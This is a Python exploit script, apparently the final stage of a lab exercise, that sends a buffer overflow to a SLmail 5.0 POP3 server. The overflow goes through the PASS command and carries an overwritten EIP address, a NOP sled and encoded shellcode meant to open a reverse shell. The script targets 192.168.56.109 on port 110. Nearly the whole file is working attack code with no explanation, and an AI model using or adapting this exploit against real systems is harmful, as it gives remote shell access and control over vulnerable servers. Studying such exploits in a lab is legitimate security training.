#! /usr/bin/python3

# This code is final part of BOF attack to a SLmail 5.0
# The code sends specially crafted shellcode to the target to create a reverse shell. 

import socket


buf = b""
buf += b'A'*2606
buf += b'\x8F\x35\x4A\x5F' #EIP
buf += b"\x90"*16           
# shellcode 
buf += b"\xda\xc7\xba\xea\xd3\x24\xf2\xd9\x74\x24\xf4\x5f\x33"
buf += b"\xc9\xb1\x5f\x31\x57\x19\x83\xc7\x04\x03\x57\x15\x08"
buf += b"\x26\xfd\x33\x74\xe4\x81\x91\xc5\x2e\x09\xf2\x31\x8b"
buf += b"\xd9\x33\x08\x74\x9d\x07\x6e\xb4\xe2\x91\x6d\xf5\xf2"
buf += b"\x7f\xa9\x5d\x11\x83\x13\xe5\xc7\xba\xe0\x16\x95\x80"
buf += b"\xcd\xeb\xb1\x9c\x88\xfe\x76\x6a\x34\x6b\x83\x9d\xf8"
buf += b"\xb2\xaf\x54\x54\x29\xa1\x7d\xb4\x71\x1d\xd7\x25\xe0"
buf += b"\xf0\x92\xee\x88\x85\xfc\xc5\x71\x14\x0b\xe6\xb1\x16"
buf += b"\x26\x86\x73\x2c\x16\x36\x5f\x1d\x03\xa5\x1b\x1b\xab"
buf += b"\xa9\x6e\xb0\x13\xdd\x91\x43\x1e\xc3\x0e\x0f\x32\x33"
buf += b"\xcc\x11\xdf\x6a\xea\x22\x28\xbf\x61\x9d\x7b\xf9\xf4"
buf += b"\x65\x9a\x79\x60\x96\x21\x73\x20\x6c\xa7\x5c\xc0\x94"
buf += b"\x96\x62\x1d\xd2\xb5\xb2\x54\xaf\xf9\xc9\x47\xfa\x25"
buf += b"\x4f\xbd\x9c\xe5\x5d\xa4\xeb\x2c\x57\x4f\xb8\x45\x59"
buf += b"\x81\x6a\x8f\xf0\xa8\x15\xa1\xd0\x4e\xa3\xe7\x30\x52"
buf += b"\xff\x22\xb2\x3a\x88\x51\xba\x5c\x92\x81\x2d\xdc\x22"
buf += b"\xcb\xdd\x1d\x8d\x41\x6f\x8e\xa7\x28\x16\x3a\xd3\x55"
buf += b"\xa6\x8a\x9b\x13\xa6\xb2\x57\x38\x38\x4e\x2e\xf7\x13"
buf += b"\x93\xef\x8a\x19\xea\xca\xd2\x3d\xf4\x7e\xf6\x03\x54"
buf += b"\x31\x31\x13\xb1\xb6\x6d\x71\x9c\xdd\xd9\x19\x3a\xed"
buf += b"\x7d\x6d\x25\xca\xf5\xde\xb6\xb3\x14\x31\xeb\x20\xef"
buf += b"\x48\x5d\xbf\x01\x37\x04\x51\x90\x20\xdc\x89\xb8\x6c"
buf += b"\xf1\x59\x29\xb1\x0b\xdf\x37\x60\x1e\x5c\x68\x4e\x93"
buf += b"\xb4\x73\xfd\xee\x75\x16\x55\xfa\x90\xd4\x88\x4a\x3b"
buf += b"\x31\x54\xee\xb4\xb7\xe0\xe2\x86\x70\x9c\xde\x73\x6c"
buf += b"\x1a\x4d\x27\x96\xda\x33\x4c\x8d\x31\xf3\xfa\xe8\x49"
buf += b"\x0f\x13\x6b\x48\xe6\xf4\xd7\x72\xa0\x5a\xfb\x9f\x3c"
buf += b"\xd4\x57\xa9\x06\x16\x50\x4c\x9c\x5d\xda\x7a\x14\x0b"
buf += b"\xb8\xd6\xe4\x6a\x82\xc5\x7f\xcc\x9c\x8c\x7a\xbc\xe9"
buf += b"\xed\xa4\x4b\x63\x5d\x08\x83\xf9\x05\xd1\x54\x04\x57"
buf += b"\x50\x90\x9a\x06\x1e\xf2\x12\x6d\x77\x94\x7f\xee\xb2"
buf += b"\x8f\x08"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
print("\nSending evil buffer...") 
s.connect(("192.168.56.109",110)) 
s.recv(1024)
user = b'USER test'
newline=b'\r\n'
s.send(user + newline) 
s.recv(1024)
PASS = b'PASS '
s.send(PASS + buf + newline) 
print("\nDone!.")

